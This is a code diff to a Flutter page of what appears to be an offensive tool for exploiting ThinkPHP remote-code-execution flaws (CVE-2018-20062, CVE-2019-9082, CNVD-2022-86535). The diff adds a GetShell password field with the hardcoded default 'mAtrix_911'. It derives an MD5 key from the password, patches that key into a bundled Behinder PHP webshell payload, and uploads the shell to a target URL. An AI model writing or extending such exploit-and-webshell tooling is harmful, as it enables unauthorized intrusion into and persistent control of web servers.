@@ -1,3 +1,6 @@
+import 'dart:convert';
+
+import 'package:crypto/crypto.dart';
 import 'package:flutter/material.dart';
 import 'package:flutter/services.dart' show rootBundle, Clipboard, ClipboardData;
 
@@ -28,7 +31,7 @@ class ThinkphpExpPage extends StatelessWidget {
             const Icon(Icons.code, color: AppColors.primary),
             const SizedBox(width: 8),
             Text(
-              'ThinkPHP 漏洞利用',
+              'ThinkPHP CVE-2018-20062/CVE-2019-9082/CNVD-2022-86535',
               style: AppTextStyles.heading(size: 14, color: AppColors.primary),
             ),
           ],
@@ -81,7 +84,7 @@ class ThinkphpExpPage extends StatelessWidget {
                       crossAxisAlignment: CrossAxisAlignment.start,
                       children: [
                         Text(
-                          'ThinkPHP 3.x / 5.x / 6.x 漏洞检测与 RCE 利用',
+                          'ThinkPHP CVE-2018-20062/CVE-2019-9082/CNVD-2022-86535',
                           style: AppTextStyles.heading(
                             size: 14,
                             color: AppColors.textPrimary,
@@ -121,6 +124,7 @@ class _ThinkphpExpCardState extends State<_ThinkphpExpCard> {
   final _urlController = TextEditingController();
   final _cmdController = TextEditingController();
   final _timeoutController = TextEditingController();
+  final _passwordController = TextEditingController(text: 'mAtrix_911');
   final _logScrollController = ScrollController();
 
   String _log = '';
@@ -326,12 +330,15 @@ class _ThinkphpExpCardState extends State<_ThinkphpExpCard> {
     setState(() => _running = true);
     _appendLog('[*] 尝试 GetShell ($vuln.label)...');
     try {
-      final shellContent = await rootBundle.loadString('assets/defaults/payloads/php_behinder.php');
+      final password = _passwordController.text.trim().isEmpty ? 'mAtrix_911' : _passwordController.text.trim();
+      var shellContent = await rootBundle.loadString('assets/defaults/payloads/php_behinder.php');
+      final key = md5.convert(utf8.encode(password)).toString().substring(0, 16);
+      shellContent = shellContent.replaceFirst(RegExp(r'\$key="[0-9a-f]{16}"'), '\$key="$key"');
       final svc = ThinkphpExpService(
         url: url,
         timeout: Duration(seconds: int.tryParse(_timeoutController.text.trim()) ?? 10),
       );
-      final shellUrl = await svc.getShell(vuln, shellContent);
+      final shellUrl = await svc.getShell(vuln, shellContent, password: password);
       if (shellUrl != null) {
         _appendLog('[+] GetShell 成功: $shellUrl');
         if (mounted) _openWebshellFromResult(context, shellUrl);
@@ -493,6 +500,8 @@ class _ThinkphpExpCardState extends State<_ThinkphpExpCard> {
   void dispose() {
     _urlController.dispose();
     _cmdController.dispose();
+    _timeoutController.dispose();
+    _passwordController.dispose();
     _logScrollController.dispose();
     super.dispose();
   }
@@ -571,6 +580,12 @@ class _ThinkphpExpCardState extends State<_ThinkphpExpCard> {
                               ),
                             ),
                           ],
+                        ),
+                        const SizedBox(height: 8),
+                        TextField(
+                          controller: _passwordController,
+                          style: AppTextStyles.body(size: 12, color: AppColors.textPrimary),
+                          decoration: _inputDecoration('GetShell 密码', 'mAtrix_911'),
                         ),
                         const SizedBox(height: 16),
                         _sectionTitle('漏洞检测'),
